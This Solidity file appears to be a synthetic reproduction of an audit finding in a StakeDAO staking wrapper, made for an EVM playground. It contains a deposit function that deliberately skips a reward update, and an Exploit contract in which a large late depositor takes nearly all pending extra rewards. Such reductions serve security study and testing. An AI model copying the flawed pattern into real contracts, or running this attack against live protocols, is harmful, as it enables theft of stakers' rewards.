// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    StakeDAO — [C-01] Missing update of extra reward per token during deposit
    (Pashov Audit Group 2025-07, finding #63598)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: StrategyWrapper._deposit checkpoints
    rewardPerTokenPaid[token] = extraRewardPerToken[token] WITHOUT first
    calling _updateExtraRewardState(), so pending extra rewards since the
    last claim are shared with new depositors. Early staker loses fair share.
    Blamed checkpoint assignment preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        _xfer(from, to, amt);
        return true;
    }

    function _xfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

/// @dev Minimal reward vault that holds extra reward tokens and reports list.
contract RewardVault {
    address[] private _rewardTokens;
    mapping(address => uint256) public rewardBalance;
    MockERC20 public immutable stakingToken;

    constructor(MockERC20 st) {
        stakingToken = st;
    }

    function addRewardToken(address t) external {
        _rewardTokens.push(t);
    }

    function getRewardTokens() external view returns (address[] memory) {
        return _rewardTokens;
    }

    function depositRewards(address token, uint256 amount) external {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
        rewardBalance[token] += amount;
    }

    function pullRewards(address token, address to, uint256 amount) external {
        rewardBalance[token] -= amount;
        MockERC20(token).transfer(to, amount);
    }
}

/// @notice Reduced StrategyWrapper extra-reward accounting.
/// Source: StrategyWrapper._deposit (Pashov StakeDAO 2025-07-21).
contract StrategyWrapper {
    struct Checkpoint {
        uint256 balance;
        mapping(address => uint256) rewardPerTokenPaid;
        mapping(address => uint256) rewards;
    }

    RewardVault public immutable REWARD_VAULT;
    MockERC20 public immutable stakingToken;
    mapping(address => uint256) public extraRewardPerToken; // scaled 1e18
    mapping(address => uint256) public extraRewardRemaining;
    uint256 public totalSupply;
    mapping(address => Checkpoint) internal checkpoints;

    constructor(RewardVault rv) {
        REWARD_VAULT = rv;
        stakingToken = rv.stakingToken();
    }

    function balanceOf(address u) external view returns (uint256) {
        return checkpoints[u].balance;
    }

    function _updateExtraRewardState(address[] memory rewardTokens) internal {
        if (totalSupply == 0) return;
        for (uint256 i; i < rewardTokens.length; i++) {
            address t = rewardTokens[i];
            uint256 pending = REWARD_VAULT.rewardBalance(t);
            // Move vault-held rewards into per-token index (full amount as newly accrued)
            if (pending > extraRewardRemaining[t]) {
                uint256 newly = pending - extraRewardRemaining[t];
                extraRewardPerToken[t] += (newly * 1e18) / totalSupply;
                extraRewardRemaining[t] = pending;
            }
        }
    }

    function _earned(address user, address token) internal view returns (uint256) {
        Checkpoint storage cp = checkpoints[user];
        uint256 delta = extraRewardPerToken[token] - cp.rewardPerTokenPaid[token];
        return cp.rewards[token] + (cp.balance * delta) / 1e18;
    }

    function deposit(uint256 amount, address receiver) external {
        address[] memory rewardTokens = REWARD_VAULT.getRewardTokens();
        // FIX: _updateExtraRewardState(rewardTokens);
        // Missing update — pending vault rewards not folded into extraRewardPerToken
        Checkpoint storage checkpoint = checkpoints[receiver];
        // Settle existing (using stale index)
        for (uint256 i; i < rewardTokens.length; i++) {
            address t = rewardTokens[i];
            checkpoint.rewards[t] = _earned(receiver, t);
            // 3. Keep track of the Extra reward tokens checkpoints at deposit time
            checkpoint.rewardPerTokenPaid[rewardTokens[i]] = extraRewardPerToken[rewardTokens[i]]; // @> VULN: checkpoints against stale extraRewardPerToken (no _updateExtraRewardState) so new depositors share pending extra rewards
        }

        stakingToken.transferFrom(msg.sender, address(this), amount);
        checkpoint.balance += amount;
        totalSupply += amount;
    }

    function withdraw(uint256 amount, address owner) external {
        address[] memory rewardTokens = REWARD_VAULT.getRewardTokens();
        _updateExtraRewardState(rewardTokens); // withdraw path updates (asymmetry)
        Checkpoint storage checkpoint = checkpoints[owner];
        for (uint256 i; i < rewardTokens.length; i++) {
            address t = rewardTokens[i];
            checkpoint.rewards[t] = _earned(owner, t);
            checkpoint.rewardPerTokenPaid[t] = extraRewardPerToken[t];
        }
        checkpoint.balance -= amount;
        totalSupply -= amount;
        stakingToken.transfer(owner, amount);
    }

    function claimExtraRewards(address user) external {
        address[] memory rewardTokens = REWARD_VAULT.getRewardTokens();
        _updateExtraRewardState(rewardTokens);
        Checkpoint storage checkpoint = checkpoints[user];
        for (uint256 i; i < rewardTokens.length; i++) {
            address t = rewardTokens[i];
            uint256 due = _earned(user, t);
            checkpoint.rewards[t] = 0;
            checkpoint.rewardPerTokenPaid[t] = extraRewardPerToken[t];
            if (due > 0) {
                extraRewardRemaining[t] -= due;
                REWARD_VAULT.pullRewards(t, user, due);
            }
        }
    }
}

/// CREATE: stakeTok(1), rewardTok(2), vault(3), wrapper(4)
contract Exploit {
    MockERC20 public stakeTok;
    MockERC20 public rewardTok;
    RewardVault public vault;
    StrategyWrapper public wrapper;

    address public constant FIRST = address(0xF1);
    address public constant SECOND = address(0xF2);

    uint256 public firstGot;
    uint256 public secondGot;
    uint256 public extraRewardAmount = 1e20;

    constructor() {
        stakeTok = new MockERC20("Stake", "STK");
        rewardTok = new MockERC20("WETH", "WETH");
        vault = new RewardVault(stakeTok);
        vault.addRewardToken(address(rewardTok));
        wrapper = new StrategyWrapper(vault);
    }

    function run() external {
        // 1. First user deposits 1e18
        stakeTok.mint(address(this), 1e18 + 100_000e18);
        stakeTok.approve(address(wrapper), type(uint256).max);
        wrapper.deposit(1e18, FIRST);

        // 2. Deposit extra rewards into vault (all should belong to first user)
        rewardTok.mint(address(this), extraRewardAmount);
        rewardTok.approve(address(vault), extraRewardAmount);
        vault.depositRewards(address(rewardTok), extraRewardAmount);

        // 3. Second user deposits 100_000e18 WITHOUT prior _updateExtraRewardState on deposit
        wrapper.deposit(100_000e18, SECOND);

        // 4. Second withdraws immediately (triggers update + captures most rewards)
        wrapper.withdraw(100_000e18, SECOND);
        wrapper.claimExtraRewards(SECOND);

        // 5. First claims
        wrapper.claimExtraRewards(FIRST);

        firstGot = rewardTok.balanceOf(FIRST);
        secondGot = rewardTok.balanceOf(SECOND);

        // Harm: second (flash depositor) got nearly all extra rewards; first got dust
        require(secondGot > firstGot, "second stole majority");
        require(secondGot > extraRewardAmount * 99 / 100, "second ~all");
        require(firstGot < extraRewardAmount / 100, "first dust only");
    }
}
